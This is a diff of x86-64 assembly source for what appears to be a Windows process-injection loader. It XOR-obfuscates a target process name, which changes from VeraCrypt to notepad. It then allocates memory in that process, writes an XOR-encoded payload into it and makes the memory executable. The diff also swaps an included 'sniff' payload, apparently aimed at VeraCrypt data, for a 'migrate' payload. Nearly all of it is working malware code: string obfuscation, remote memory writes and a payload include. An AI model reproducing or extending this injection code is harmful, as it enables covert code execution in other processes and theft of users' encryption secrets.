@@ -27,15 +27,15 @@ WinMain:
     mov rcx, [rbp - 16]             ; kernel mod handle
     call populate_kernel_function_ptrs_by_name
 
-    mov rcx, veracrypt_xor
-    mov rdx, veracrypt_xor.len
+    mov rcx, notepad_xor
+    mov rdx, notepad_xor.len
     mov r8, xor_key
     mov r9, xor_key.len
     call my_xor
 
 .loop:
-    mov rcx, veracrypt_xor
-    mov rdx, veracrypt_xor.len
+    mov rcx, notepad_xor
+    mov rdx, notepad_xor.len
     call find_target_process_id     ; proc id
 
     cmp rax, 0
@@ -62,7 +62,7 @@ WinMain:
     sub rsp, 16                     ; 8 byte 5th arg + 8 byte stack align
     mov rcx, [rbp - 32]             ; proc handle
     mov rdx, 0
-    mov r8, sniff_data_xor.len
+    mov r8, migrate_data_xor.len
     mov r9, MEM_RESERVE
     xor r9, MEM_COMMIT
     mov qword [rsp + 32], PAGE_READWRITE
@@ -74,8 +74,8 @@ WinMain:
 
     mov [rbp - 40], rax             ; payload mem
 
-    mov rcx, sniff_data_xor
-    mov rdx, sniff_data_xor.len
+    mov rcx, migrate_data_xor
+    mov rdx, migrate_data_xor.len
     mov r8, xor_key
     mov r9, xor_key.len
     call my_xor
@@ -83,8 +83,8 @@ WinMain:
     sub rsp, 16                     ; 1 arg + 8 byte stack align
     mov rcx, [rbp - 32]             ; proc handle
     mov rdx, [rbp - 40]             ; payload mem
-    mov r8, sniff_data_xor
-    mov r9, sniff_data_xor.len
+    mov r8, migrate_data_xor
+    mov r9, migrate_data_xor.len
     mov qword [rsp + 32], 0
     call [write_process_memory]
     add rsp, 16                     ; 1 arg + 8 byte stack align
@@ -95,7 +95,7 @@ WinMain:
     sub rsp, 16                     ; 8 byte 5th arg + 8 byte stack align
     mov rcx,  [rbp - 32]            ; proc handle
     mov rdx, [rbp - 40]             ; payload mem
-    mov r8, sniff_data_xor.len
+    mov r8, migrate_data_xor.len
     mov r9, PAGE_EXECUTE_READ
     mov [rsp + 32], rbp
     sub qword [rsp + 32], 48        ; &dwOldProtect
@@ -150,6 +150,10 @@ section .data
 veracrypt_xor: db 0x66, 0x55, 0x42, 0x51, 0x73, 0x42, 0x49, 0x40, 0x44, 0x1e, 0x55, 0x48, 0x55, 0x0
 .len equ $ - veracrypt_xor - 1
 
+notepad_xor: db 0x5e, 0x5f, 0x44, 0x55, 0x40, 0x51, 0x54, 0x1e, 0x55, 0x48, 0x55, 0
+.len equ $ - notepad_xor - 1
+
 ; %include '..\tests\calc-thread64.inc.asm'
-%include '..\sniff\sniff.bin.asm'
+; %include '..\sniff\sniff.bin.asm'
+%include '..\migrate\migrate.bin.asm'
 %include '..\utils_64_data.asm'
